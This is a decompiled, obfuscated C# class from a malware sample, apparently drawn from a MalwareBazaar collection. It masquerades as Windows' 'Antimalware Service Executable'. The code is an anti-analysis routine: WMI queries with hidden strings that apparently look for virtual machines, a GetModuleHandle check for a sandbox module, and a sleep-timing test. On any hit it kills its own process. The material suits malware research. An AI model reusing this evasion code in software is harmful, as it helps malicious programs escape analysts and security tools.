// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Antimalware Service Executable, Version=4.18.2110.6, Culture=neutral, PublicKeyToken=null
// MVID: BAA675AC-450F-4411-0EC7-1781EC73690A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-DangerousObject.Multi.Generic-1b75e4ffe67a5c5a8939c62c1028556f3995341d39f5aed9129637646f7b6e5f.exe

using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

internal sealed class \u000F\u2000 : \u0008\u2000
{
  [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
  private static extern IntPtr \u0002(string _param0);

  internal static void \u0002()
  {
    \u000F\u2000.\u0003();
    \u000F\u2000.\u0005();
    \u000F\u2000.\u0008();
  }

  private static void \u0003()
  {
    using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u000E\u2001.\u0002(-2006066976)))
    {
      using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
      {
        foreach (ManagementBaseObject managementBaseObject in objectCollection)
        {
          if (managementBaseObject[\u000E\u2001.\u0002(-2006067141)].ToString().ToLower() == \u000E\u2001.\u0002(-2006067164) && managementBaseObject[\u000E\u2001.\u0002(-2006067192)].ToString().ToUpperInvariant().Contains(\u000E\u2001.\u0002(-2006067076)) || managementBaseObject[\u000E\u2001.\u0002(-2006067141)].ToString().ToLower().Contains(\u000E\u2001.\u0002(-2006067086)) || managementBaseObject[\u000E\u2001.\u0002(-2006067192)].ToString() == \u000E\u2001.\u0002(-2006067103))
            Process.GetCurrentProcess().Kill();
        }
      }
    }
    foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(\u000E\u2001.\u0002(-2006067120), \u000E\u2001.\u0002(-2006067133)).Get())
    {
      if (managementBaseObject.GetPropertyValue(\u000E\u2001.\u0002(-2006066283)).ToString().Contains(\u000E\u2001.\u0002(-2006066290)) && managementBaseObject.GetPropertyValue(\u000E\u2001.\u0002(-2006066283)).ToString().Contains(\u000E\u2001.\u0002(-2006066179)))
        Process.GetCurrentProcess().Kill();
    }
  }

  private static void \u0005()
  {
    if (\u000F\u2000.\u0002(\u000E\u2001.\u0002(-2006066186)).ToInt32() == 0)
      return;
    Process.GetCurrentProcess().Kill();
  }

  private static void \u0008()
  {
    int millisecondsTimeout = new Random().Next(3000, 10000);
    DateTime now = DateTime.Now;
    Thread.Sleep(millisecondsTimeout);
    if ((DateTime.Now - now).TotalMilliseconds >= (double) millisecondsTimeout)
      return;
    Process.GetCurrentProcess().Kill();
  }
}
